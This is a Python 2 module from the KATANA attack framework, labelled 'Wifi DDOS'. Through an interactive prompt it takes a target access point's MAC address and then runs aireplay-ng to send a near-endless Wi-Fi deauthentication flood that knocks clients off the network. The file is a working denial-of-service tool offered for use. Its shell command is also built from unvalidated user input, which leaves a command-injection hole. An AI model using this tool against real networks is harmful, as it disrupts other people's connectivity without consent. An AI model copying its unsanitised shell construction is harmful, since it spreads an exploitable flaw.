# KATANA
# Wifi DDOS
# Script by RedToor
# 11/06/2015

from core import help
import subprocess
import commands
W  = '\033[0m'  
R  = '\033[31m' 
G  = '\033[32m' 
O  = '\033[33m' 
B  = '\033[34m' 
P  = '\033[35m' 
C  = '\033[36m' 
GR = '\033[37m'
defaultcar="wlan0"
defaultint="mon0"
defaultmac="68:94:23:6E:48:5B"
defaultcha="10"
def ddos():
	global defaultint,defaultmac,defaultcha,defaultcar
	actions = raw_input(O+"     ktn/wifi/ddos > "+W)
	if actions == "show options":
		print ""
		print "     ["+R+"+"+W+"] options"
		print "     |Mac Target      : yes"
		print "     |Channel         : yes"
		print "     |Interface       : yes/no"
		print "     |Monitor         : yes\n"
		print ""
		print "     ["+G+"+"+W+"] options current"
		print "     |mac             : ",defaultmac
		print "     |channel         : ",defaultcha
		print "     |interface       : ",defaultcar
		print "     |monitor         : ",defaultint
		print "\n"
		print "     ["+G+"+"+W+"] Auxiliar help"
		Interfaces=commands.getoutput("airmon-ng | grep 'wlan' | awk '{print $1}'")
		Monitor=commands.getoutput("airmon-ng | grep 'mon' | awk '{print $1}'")
		Interfaces=Interfaces.replace("\n",",")
		Monitor=Monitor.replace("\n",",")
		print "     |Interfaces      : ",Interfaces
		print "     |Monitor         : ",Monitor
		print ""
	elif actions=="back":
		pass 
	elif actions=="exit":
		print C+"     GooD"+W+" bye."
		exit()
	elif actions[0:7] == "set mac":
			defaultmac = actions[8:]
			print "     Mac Target   : "+defaultmac+" "+O+"     Saved!!!"+W
			ddos()
	elif actions[0:11] == "set channel":
			defaultcha = actions[12:]
			print "     Channel      : "+defaultcha+" "+O+"     Saved!!!"+W
			ddos()
	elif actions[0:13] == "set interface":
			defaultcar = actions[14:]
			print "     Interface    : "+defaultcar+" "+O+"     Saved!!!"+W
			ddos()
	elif actions[0:11] == "set monitor":
			defaultint = actions[12:]
			print "     Monitor      : "+defaultint+" "+O+"     Saved!!!"+W
			ddos()
	elif actions == "run":
		try:
			print "     ["+G+"+"+W+"] options current"
			print "     |mac             : ",defaultmac
			print "     |channel         : ",defaultcha
			print "     |interface       : ",defaultcar
			print "     |monitor         : ",defaultint
			print ""
			print("     ["+G+"+"+W+"] Starting DDOS to "+defaultmac)
			try:
				print("     ["+O+"!"+W+"] Press (Ctrl + C) for Stop DDOS")
				subprocess.call('aireplay-ng --deauth 99999999999 -o 1 -a '+defaultmac+' '+defaultint+'', shell=True)
			except(KeyboardInterrupt, SystemExit):
				print("\n     ["+O+"!"+W+"] Stoped DDOS")
		except(KeyboardInterrupt, SystemExit):
			print("\n     ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
	else:
		print "     ["+O+"!"+W+"] command No Accept"+W
	ddos()
